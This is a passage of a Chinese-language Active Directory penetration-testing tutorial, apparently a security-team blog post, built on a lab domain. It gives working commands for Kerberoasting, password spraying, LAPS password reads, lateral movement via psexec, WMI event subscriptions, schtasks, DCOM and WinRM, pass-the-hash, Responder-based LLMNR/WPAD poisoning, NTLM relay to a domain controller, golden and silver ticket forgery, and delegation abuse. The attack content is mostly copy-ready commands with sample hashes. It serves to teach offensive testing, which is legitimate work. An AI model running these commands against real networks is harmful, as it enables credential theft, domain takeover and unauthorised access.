<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/aadc3bf934ef7e25df2ad0a70b1a90e3.png" alt="img" data-caption="img" loading="lazy"></p>
<p>再利用mimikatz导出：</p>
<blockquote>
<p>kerberos::list /export<br><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/4e26bd19517da1f92d686a39860db6a4.png" alt="img" data-caption="img" loading="lazy"></p>
</blockquote>
<p>然后利用<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack</a>暴力破解：</p>
<blockquote>
<p>python tgsrepcrack.py wordlist.txt 2-40a10000-win7user<a target="_blank" rel="noopener" href="https://github.com/test">@test</a>~test-JUMBOLAB.COM.kirbi</p>
</blockquote>
<p>最终成功获取该域用户密码：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/eb278ece5c66c23c449f5206838f65a3.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="4-6-密码喷射"><a href="#4-6-密码喷射" class="headerlink" title="4.6 密码喷射"></a>4.6 密码喷射</h2><p>弱口令，永远改不完。在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解：</p>
<p>爆破用户：</p>
<blockquote>
<p>kerbrute userenum -d jumbolab.com usernames.txt</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/ec2dc4dbeb8e058b33d4eb14ee51b79c.png" alt="img" data-caption="img" loading="lazy"></p>
<p>密码喷射:</p>
<blockquote>
<p>kerbrute passwordspray -d jumbolab.com username.txt aA1234567</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/9329f61ca8ec19bdabef3bfa35665b60.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="4-7-LAPS"><a href="#4-7-LAPS" class="headerlink" title="4.7 LAPS"></a>4.7 LAPS</h2><p>Local Administrator Password<br>Solution是密码解决方案，为了防止一台机器被抓到密码后，然后网内都是同密码机器导致被横向渗透。但是也存在相应的安全隐患，当我们拿下域控时，可以查看计算机本地密码;当权限配置不当时，也会导致其他用户有权限查看他人计算机本地密码：</p>
<blockquote>
<p>powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</p>
</blockquote>
<p>如果安装LAPS，在安装的软件列表里能看到：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/db678d6e01c9109449b34b1e4d42aacc.png" alt="img" data-caption="img" loading="lazy"></p>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>当我们获取到某个机器账号密码、获取到hash了，后续我们应该怎么做，如何做，这就是本章介绍的内容。当然，当我们拿下更多的机器时，别忘记了，信息收集必不可少。</p>
<h2 id="5-1-账号密码连接"><a href="#5-1-账号密码连接" class="headerlink" title="5.1 账号密码连接"></a>5.1 账号密码连接</h2><p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p>
<p>a、IPC</p>
<blockquote>
<p>net use \1.1.1.1\ipc$ “password” /user:username</p>
</blockquote>
<p>b、Psexec</p>
<blockquote>
<p>用服务启动的方式： psexec \target -accepteula -u username -p password cmd.exe psexec.py jumbolab.com/<a href="mailto:administrator@172.16.127">administrator@172.16.127</a>.184</p>
</blockquote>
<p>c、WMI</p>
<blockquote>
<p>方法一 wmic /user:”jumbolab.com\win7user” /password:”password” /node:172.16.127.184 process call create “notepad”</p>
<p>方法二 Invoke-WmiMethod -class win32_process -name create -argumentlist ‘notepad’ -ComputerName 172.16.127.184 -Credential ‘jumbolab.com\win7user’</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">方法三<span class="hljs-variable">$filterName</span> = <span class="hljs-string">&#x27;BotFilter82&#x27;</span><span class="hljs-variable">$consumerName</span> = <span class="hljs-string">&#x27;BotConsumer23&#x27;</span><span class="hljs-variable">$exePath</span> = <span class="hljs-string">&#x27;C:\Windows\System32\notepad.exe&#x27;</span><span class="hljs-variable">$Query</span> = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><span class="hljs-variable">$WMIEventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-NameSpace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$filterName</span>;EventNameSpace=<span class="hljs-string">&quot;root\cimv2&quot;</span>;QueryLanguage=<span class="hljs-string">&quot;WQL&quot;</span>;Query=<span class="hljs-variable">$Query</span>&#125; <span class="hljs-literal">-ErrorAction</span> Stop <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">127.184</span> <span class="hljs-literal">-Credential</span> <span class="hljs-string">&#x27;jumbolab.com\win7user&#x27;</span><span class="hljs-variable">$WMIEventConsumer</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$consumerName</span>;ExecutablePath=<span class="hljs-variable">$exePath</span>;CommandLineTemplate=<span class="hljs-variable">$exePath</span>&#125;  <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">127.184</span> <span class="hljs-literal">-Credential</span> <span class="hljs-string">&#x27;jumbolab.com\win7user&#x27;</span><span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-keyword">Filter</span>=<span class="hljs-variable">$WMIEventFilter</span>;Consumer=<span class="hljs-variable">$WMIEventConsumer</span>&#125;<br></code></pre></td></tr></table></figure>
<p>d、Schtasks</p>
<blockquote>
<p>schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru “SYSTEM” /tn “windowsupdate” /sc DAILY /tr “calc” /F schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</p>
</blockquote>
<p>e、AT</p>
<blockquote>
<p>at \1.1.1.1 15:15 calc</p>
</blockquote>
<p>f、SC</p>
<blockquote>
<p>sc \1.1.1.1 create windowsupdate binpath= “calc” sc \1.1.1.1 start windowsupdate</p>
</blockquote>
<p>g、REG</p>
<blockquote>
<p>reg add \1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d “calc”</p>
</blockquote>
<p>h、DCOM</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">方法一<span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::CreateInstance(<span class="hljs-selector-attr">[type]</span>::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;1.1.1.1&quot;</span>))<span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)方法二<span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[Type]</span>::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;1.1.1.1&quot;</span>)<span class="hljs-variable">$obj</span> = <span class="hljs-selector-attr">[System.Activator]</span>::CreateInstance(<span class="hljs-variable">$com</span>)<span class="hljs-variable">$item</span> = <span class="hljs-variable">$obj</span><span class="hljs-selector-class">.item</span>()<span class="hljs-variable">$item</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)方法三<span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[Type]</span>::GetTypeFromCLSID(<span class="hljs-string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span>,<span class="hljs-string">&quot;1.1.1.1&quot;</span>)<span class="hljs-variable">$obj</span> = <span class="hljs-selector-attr">[System.Activator]</span>::CreateInstance(<span class="hljs-variable">$com</span>)<span class="hljs-variable">$obj</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
<p>i、WINRM</p>
<blockquote>
<p>winrs -r:<a target="_blank" rel="noopener" href="http://1.1.1.1:5985/">http://1.1.1.1:5985</a> -u:Administrator -p:password “whoami” winrs -r:<a target="_blank" rel="noopener" href="http://dcserver.jumbolab.com:5985/">http://dcserver.jumbolab.com:5985</a> -u:jumbolab\administrator -p:password “whoami “</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/5594535294c57216b8d2b9b9b198af3c.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="5-2-PTH"><a href="#5-2-PTH" class="headerlink" title="5.2 PTH"></a>5.2 PTH</h2><p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p>
<h3 id="5-2-1-impacket套件"><a href="#5-2-1-impacket套件" class="headerlink" title="5.2.1 impacket套件"></a>5.2.1 impacket套件</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<blockquote>
<p>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c domain/<a href="mailto:administrator@1.1.1">administrator@1.1.1</a>.1 “whoami”</p>
<p>psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:518B98AD4178A53695DC997AA02D455C domiain/<a href="mailto:administrator@1.1.1">administrator@1.1.1</a>.1 “whoami”</p>
<p>smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:CCEF208C6485269C20DB2CAD21734FE7 domiain/<a href="mailto:administrator@1.1.1">administrator@1.1.1</a>.1 “whoami” |</p>
</blockquote>
<h3 id="5-2-2-Invoke-TheHash套件"><a href="#5-2-2-Invoke-TheHash套件" class="headerlink" title="5.2.2 Invoke-TheHash套件"></a>5.2.2 Invoke-TheHash套件</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/">https://github.com/Kevin-Robertson/Invoke-TheHash/</a></p>
<blockquote>
<p>Invoke-WMIExec -Target 1.1.1.1 -Domain test.local -Username username -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command “calc.exe” -verbose</p>
<p>Invoke-SMBExec -Target 1.1.1.1 -Domain test.local -Username username -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command “calc.exe” -verbose</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/726a2c16b28bff37028c16bff161196a.png" alt="img" data-caption="img" loading="lazy"></p>
<h3 id="5-2-3-mimikatz"><a href="#5-2-3-mimikatz" class="headerlink" title="5.2.3 mimikatz"></a>5.2.3 mimikatz</h3><p>使用如下命令：</p>
<blockquote>
<p>privilege::debug sekurlsa::pth /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1</p>
</blockquote>
<p>弹出cmd：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/624d3374776021c4da5c723a7593857e.png" alt="img" data-caption="img" loading="lazy"></p>
<p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p>
<p>抓取AES-256密钥：</p>
<blockquote>
<p>mimikatz: privilege::debug sekurlsa::ekeys privilege::debug sekurlsa::pth /user:test1 /domain:test.local /aes256:aes256key</p>
</blockquote>
<h2 id="5-3-NTLM-Relay"><a href="#5-3-NTLM-Relay" class="headerlink" title="5.3 NTLM-Relay"></a>5.3 NTLM-Relay</h2><p>上述都是“主动性”的攻击行为，也就是主动去连接别人，那我们也可以尝试“被动性”攻击，当别人访问我们时，或者说是无感知访问时，我们能做什么操作？</p>
<p>实验环境：</p>
<p>win7 172.16.127.184 普通域用户</p>
<p>win10 172.16.127.170 域管</p>
<p>dcserver 172.16.127.173 域控</p>
<p>kali 172.16.127.129 攻击机</p>
<p>利用工具：</p>
<p>Responder、impacket</p>
<h3 id="5-3-1-LLMNR"><a href="#5-3-1-LLMNR" class="headerlink" title="5.3.1 LLMNR"></a>5.3.1 LLMNR</h3><p>先来一段百科介绍，链路本地多播名称解析（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解析为同一本地链路上的主机。它是包含在Windows<br>Vista中，Windows Server 2008中，Windows 7中，Windows 8中和的Windows<br>10。它也被实施systemd在Linux上-resolved。 LLMNR定义在RFC 4795。</p>
<p>在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析<br>(LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或<br>mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS<br>服务器切断了子网，则支持 LLMNR<br>的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。</p>
<p>除了在网络出现故障的情况下提供名称解析以外，LLMNR<br>在建立临时对等网络（例如，机场候机区域）方面也非常有用。</p>
<p>翻译成白话文怎么说：你正常内网中如访问真实存在的机器，如jumbo01,当有一天你不小心输成了不存在的机器jumbo02，客户端就会问内网中谁是jumbo02啊，有没有是jumbo02的人啊。</p>
<p>攻击手法v1.0</p>
<p>首先我们如果访问一台不存在的机器jumbo02，是以下这个结果</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/d677e03714860a4aca4cbe399a86c27f.png" alt="img" data-caption="img" loading="lazy"></p>
<p>那我们如果我们在客户端询问谁是jumbo02的时候应答他的话，就是这个结果</p>
<p>攻击机执行</p>
<blockquote>
<p>responder -I eth0</p>
</blockquote>
<p>客户端访问jumbo02提示需要输入密码</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/49017a447e2fbd82e46e7e54c211730f.png" alt="img" data-caption="img" loading="lazy"></p>
<p>输入密码后，攻击机收到net-ntlm：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/ecc4a0aa0ab6f963120085cf71631c0e.png" alt="img" data-caption="img" loading="lazy"></p>
<p>收到net-ntlm以后我们就可以尝试利用hashcat进行破解等攻击。</p>
<h3 id="5-3-2-WPAD"><a href="#5-3-2-WPAD" class="headerlink" title="5.3.2 WPAD"></a>5.3.2 WPAD</h3><p>先来一段百科介绍，网络代理自动发现协议（Web Proxy Auto-Discovery<br>Protocol，WPAD）是一种客户端使用DHCP和/或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p>
<p>翻译成白话文怎么说：就是你的上网配置、怎么上网，如果你浏览器设置了上网自动检测设置（默认配置），客户端上网的时候，就会问，谁是wpad服务器啊，你是wpad服务器啊，然后拿着pac文件上网去了。</p>
<p>攻击手法v1.0</p>
<p>首先我们本身想访问存在的网站 <a target="_blank" rel="noopener" href="http://www.chinabaiker.com/">www.chinabaiker.com</a> ,可是不小心打错了一个字母或者多打少打了一个字母，默认会直接跳到搜到引擎上去，或者提示无法访问，比如 <a target="_blank" rel="noopener" href="http://www.chinabaikee.com/">www.chinabaikee.com</a></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/744915b82870dd973cea27405cb48c62.png" alt="img" data-caption="img" loading="lazy"></p>
<p>那如果我们伪造wpad服务器的话，首先攻击机执行</p>
<blockquote>
<p>responder -I eth0 -wFb</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/73a4fc647caa9a32ce693b8f8225311b.png" alt="img" data-caption="img" loading="lazy"></p>
<p>这里使用-b参数强制使用401认证</p>
<p>客户端访问一个不存在的域名时会跳出登录框</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/9ce3b8c4c5f1380ff01e3ebd44f2755e.png" alt="img" data-caption="img" loading="lazy"></p>
<p>输入账号密码以后，我们收到明文账号密码</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/dd647895d59815bb45ba1b699b1babd3.png" alt="img" data-caption="img" loading="lazy"></p>
<p>从responder的信息反馈能得知，实际上是利用wpad欺骗返回了一个401认证，导致欺骗我们获取了其账号密码。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/a2c8d1115ea079859458e4bab4adf4ea.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/fc24d1ffc70e59ab15c69c7e7c718fa0.png" alt="img" data-caption="img" loading="lazy"></p>
<p>攻击手法v1.1</p>
<p>既然我们能够让客户端下载我们的pac，就能在pac里面让客户端的流量走我们这边，这里我利用msf配置burp演示代理抓取客户端流量。</p>
<p>攻击机执行</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/spoof/</span>nbns<span class="hljs-regexp">/nbns_responseset regex WPADset spoofip attackiprunuse auxiliary/</span>server/wpadset proxy <span class="hljs-number">172.16</span>.<span class="hljs-number">127.155</span>run<br></code></pre></td></tr></table></figure>
<p>打开burp，以下只在非域内但是同一个网络中的机器的firefox成功</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/24a4840a1224c98806e0365e14698bac.png" alt="img" data-caption="img" loading="lazy"></p>
<p>为什么会出现上面的问题呢，实际上是因为<a target="_blank" rel="noopener" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">MS16-077补丁问题</a>。</p>
<blockquote>
<p>In 2016 however, Microsoft published a security bulletin MS16-077, which mitigated this attack by adding two important protections: – The location of the WPAD file is no longer requested via broadcast protocols, but only via DNS. – Authentication does not occur automatically anymore even if this is requested by the server.</p>
</blockquote>
<p>利用mitm6让客户端设置我们为ipv6 dns服务器</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/9fcff97654b793ca18799b4764de70cf.png" alt="img" data-caption="img" loading="lazy"></p>
<p>wpad成功在chrome上欺骗</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/429515c5566a1aeb5ea10515e6456227.jpg" alt="img" data-caption="img" loading="lazy"></p>
<p>PS：以上成功还是在非域内机器。</p>
<p>攻击手法v2.0</p>
<p>上面说了多，最重要的不过还是权限。大家应该知道smb<br>relay，但是这个漏洞很早就在MS08-068补丁中被修复了。但是这个不妨碍我们在未校验smb签名等情况下进行NTLM-Relay转发。我们执行responder，首先关闭掉smb，给接下来的ntlmrelayx使用。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/33fb75f69b6a33780650ccaf98a2a410.png" alt="img" data-caption="img" loading="lazy"></p>
<blockquote>
<p>responder -I eth0 ntlmrelayx.py -t 172.16.127.173 -l ./</p>
</blockquote>
<p>域管机器访问不存在的机器时，会中继到域控机器，我们成功获取shell</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/21b6cbe72b9c460cc5ad82af5e240654.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/59959672dc1cc1b04a1f07dfb35a514f.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="5-4-域信任"><a href="#5-4-域信任" class="headerlink" title="5.4 域信任"></a>5.4 域信任</h2><p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/67b341bf9a90ec09dc7c0d09a6ba2cf5.png" alt="img" data-caption="img" loading="lazy"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</a></p>
<p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p>
<blockquote>
<p>lsadump::lsa /patch |</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/369a36df29f70a94666b2c7b41111c9f.png" alt="img" data-caption="img" loading="lazy"></p>
<p>再使用powerview获取父域的sid：</p>
<blockquote>
<p>Get-DomainComputer -Domain jumbolab.com</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/ac6f8054f05dbb6df518a3468b9d6b8f.png" alt="img" data-caption="img" loading="lazy"></p>
<p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p>
<blockquote>
<p>kerberos::golden /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:<a target="_blank" rel="noopener" href="http://child.jumbolab.com/">child.jumbolab.com</a> /sid:S-1-5-21-1786649982-4053697927-1628754434 /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</p>
</blockquote>
<p>最终成功获取父域权限：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/588248c396495306a5f6ee6d21da1352.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="5-5-攻击Kerberos"><a href="#5-5-攻击Kerberos" class="headerlink" title="5.5 攻击Kerberos"></a>5.5 攻击Kerberos</h2><p>在域中，最核心的就是kerberos协议了，但是也会出现各种安全问题，甚至可以以一个普通域用户提权到system权限，配置不当甚至可以获取到域控权限。</p>
<h3 id="5-5-1-PTT"><a href="#5-5-1-PTT" class="headerlink" title="5.5.1 PTT"></a>5.5.1 PTT</h3><p>当我们抓取到了krbtgt hash时，能做什么？继续往下看。</p>
<h4 id="5-5-1-1-金票据"><a href="#5-5-1-1-金票据" class="headerlink" title="5.5.1.1 金票据"></a>5.5.1.1 金票据</h4><p>上面提到了ms14-068，也介绍Kerberos协议，知道了TGT是由krbtgt加密而成。因此当拿到krbtgt账号hash时，就可以构造一个任意权限的tgt了：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/0bb5e16172b0e32a55a5a35064143785.png" alt="img" data-caption="img" loading="lazy"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>使用方法：</p>
<blockquote>
<p>mimikatz kerberos::purge kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt: krbtgt hash值 /ticket:administrator.kiribi kerberos::ptt administrator.kiribi kerberos::tgt dir \dc.domain.com\c$</p>
</blockquote>
<h4 id="5-5-1-2-银票据"><a href="#5-5-1-2-银票据" class="headerlink" title="5.5.1.2 银票据"></a>5.5.1.2 银票据</h4><p>上面的金票据是伪造的TGT，银票据是伪造TGS，由服务账号密码加密而成。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/249fe3d260df35609f5f646e6c548f0d.png" alt="img" data-caption="img" loading="lazy"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>利用方法：</p>
<blockquote>
<p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域控全称 /service:要访问的服务，如cifs /rc4:NTLM，计算机账号hash /user:user /ptt” dir \server\c$</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/46928a316494f9e5bd69f05718bd4b65.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="5-5-1-3-kekeo"><a href="#5-5-1-3-kekeo" class="headerlink" title="5.5.1.3 kekeo"></a>5.5.1.3 kekeo</h4><p>利用kekeo进行ptt：</p>
<blockquote>
<p>kekeo “tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”</p>
</blockquote>
<p>执行后生成票据 <a href="mailto:TGT_test1@TEST.LOCAL_krbtgt">TGT_test1@TEST.LOCAL_krbtgt</a>~<a href="mailto:test.local@TEST.LOCAL.kirbi">test.local@TEST.LOCAL.kirbi</a></p>
<p>接下来导入票据：</p>
<blockquote>
<p>kekeo “kerberos::ptt <a href="mailto:TGT_test1@TEST.LOCAL_krbtgt">TGT_test1@TEST.LOCAL_krbtgt</a>~<a href="mailto:test.local@TEST.LOCAL.kirbi">test.local@TEST.LOCAL.kirbi</a>” dir \server\c$</p>
</blockquote>
<h3 id="5-5-2-委派"><a href="#5-5-2-委派" class="headerlink" title="5.5.2 委派"></a>5.5.2 委派</h3><h4 id="5-5-2-1-基于资源的约束委派"><a href="#5-5-2-1-基于资源的约束委派" class="headerlink" title="5.5.2.1 基于资源的约束委派"></a>5.5.2.1 基于资源的约束委派</h4><p>流程图如下：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/7005f6a202265f5a168314aaa8d0ed91.png" alt="img" data-caption="img" loading="lazy"></p>
<p>个人简单理解为A机器设置基于资源的约束委派给B(设置msDS-AllowedToActOnBehalfOfOtherIdentity属性)，则B可以通过s4u协议申请高权限票据对A进行利用。利用过程如下：</p>
<p>普通域用户默认可以添加10个机器账号，添加spnspnspn$并设置msds-allowedtoactonbehalfofotheridentity：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/b6974d7d9d839924944f2b69d8e3ad26.png" alt="img" data-caption="img" loading="lazy"></p>
<blockquote>
<p>get-adcomputer win7 -properties principalsallowedtodelegatetoaccount</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/d79fc29f02295094d65e0865fece1f07.png" alt="img" data-caption="img" loading="lazy"></p>
<p>利用s4u协议申请高权限票据：</p>
<blockquote>
<p>getST.py -dc-ip 172.16.127.173 jumbolab.com/spnspnspn$:spnspnspn -spn cifs/win7.jumbolab.com -impersonate administrator</p>
</blockquote>
<p>导入票据：</p>
<blockquote>
<p>export KRB5CCNAME=administrator.ccache</p>
</blockquote>
<p>访问目标机器：</p>
<blockquote>
<p>smbexec.py -no-pass -k -debug win7.jumbolab.com</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/8c39a13c8c01ad3198fcb134b2e367ce.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="5-5-2-2-非约束委派"><a href="#5-5-2-2-非约束委派" class="headerlink" title="5.5.2.2 非约束委派"></a>5.5.2.2 非约束委派</h4><p>流程图如下：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/7a17651be42552048a322ae3a5d00a88.png" alt="img" data-caption="img" loading="lazy"></p>
<p>个人简单理解为user访问service1服务时，如果service1服务开启了非约束委派，则在user访问service1服务时，会把自身的tgt发送给service1，因此service1可以利用user的tgt去访问user可以访问的服务。利用过程如下：</p>
<p>win7机器开启了非约束委派：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e7cb6b0f93ac38e1323c4488ab07eef6.png" alt="img" data-caption="img" loading="lazy"></p>
<p>下面我们再利用Spooler打印机服务错误强制让运行了spooler服务的机器通过kerberos或ntlm的方式连接指定的目标机器：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/f5fb0c6f32eb3f09889b6c117e6188c1.png" alt="img" data-caption="img" loading="lazy"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
<p>SpoolSample.exe dcserver win7</p>
<p>导出tgt：</p>
<blockquote>
<p>mimikatz privilege::debug sekurlsa::tickets /export</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/d4ef40ce43fd48b8de7ae8ad542cecc7.png" alt="img" data-caption="img" loading="lazy"></p>
<p>导入票据：</p>
<blockquote>
<p>kerberos::ptt [0;1f9fc7]-2-0-60a10000-DCSERVER$<a target="_blank" rel="noopener" href="https://github.com/krbtgt">@krbtgt</a>-JUMBOLAB.COM.kirbi</p>
</blockquote>
